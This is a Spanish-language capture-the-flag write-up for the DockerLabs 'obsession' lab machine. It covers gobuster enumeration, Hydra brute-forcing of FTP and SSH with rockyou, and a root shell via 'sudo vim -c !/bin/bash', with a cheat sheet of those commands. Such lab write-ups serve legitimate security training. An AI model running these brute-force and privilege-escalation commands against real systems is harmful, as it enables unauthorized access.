# DockerLabs - obsession

## Resumen
- **Dificultad:** Very Easy
- **Técnicas:** Web enumeration, FTP/SSH brute-forcing, escalada de privilegios vía sudo (vim)
- **Tiempo:** ~20 minutos
- **Fecha:** 2026-04-12

## Info
| | |
|---|---|
| IP | 172.17.0.2 |
| OS | Ubuntu (Docker) |
| Servicios | 21/tcp (FTP), 22/tcp (SSH), 80/tcp (HTTP) |

---

## Reconocimiento

### Escaneo de puertos

```bash
nmap -sCV -p- 172.17.0.2 -oN targeted
```

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 21/tcp | FTP | vsftpd 3.0.5 |
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu 3ubuntu13 |
| 80/tcp | HTTP | Apache 2.4.58 |

---

## Enumeración

### Gobuster (HTTP)

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/common.txt
```

Encontramos `/backup` — al acceder, hay un archivo `backup.txt`:

```
Usuario para todos mis servicios: russoski (cambiar pronto!)
```

**Usuario encontrado:** `russoski`

---

## Explotación

### FTP Brute-forcing con Hydra

```bash
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ftp://172.17.0.2
```

**Credenciales:** `russoski:<password>`

### SSH Brute-forcing con Hydra

También se puede acceder por SSH:

```bash
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
ssh russoski@172.17.0.2
```

---

## Escalada de privilegios

### Enumeración de permisos sudo

```bash
sudo -l
```

**Resultado:** El usuario tiene permisos de sudo sin contraseña.

### Obtención de shell root

```bash
sudo vim -c '!/bin/bash'
whoami
# root
```

---

## Flag

**Extra:** Además del usuario `russoski`, hay más archivos interesantes:

- `/home/russoski/Documentos/Nikola Tesla.jpg` — imagen
- `/home/russoski/content/README.md` — link a GitHub del usuario
- `/home/russoski/content/Strong-Credentials.py` — script "generador de contraseñas fuertes" (spoiler: no es tan firme!)
- `/root/Video-Nagore-Fernandez.txt` — mensaje final con link a YouTube:

```
Al fin lo terminé! es tan hermosa.. <3
https://www.youtube.com/shorts/_v8GzGReTAk
```

---

## Flag

No hay flag visible — el objetivo es obtener acceso root.

---

## Lecciones aprendidas

1. **Web enumeration**: siempre correr gobuster en puertos HTTP
2. **Credenciales reutilizadas**: el mismo usuario usa la misma contraseña en FTP y SSH
3. **sudo -l**: siempre verificar permisos sudo, incluso en máquinas "fáciles"

---

## Comandos útiles

```bash
# Reconocimiento
nmap -sCV -p- 172.17.0.2 -oN targeted

# Web enumeration
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/common.txt

# Buscar usuario
curl http://172.17.0.2/backup/backup.txt

# Brute-force
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ftp://172.17.0.2
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2

# Acceso
ssh russoski@172.17.0.2

# Escalada
sudo -l
sudo bash
```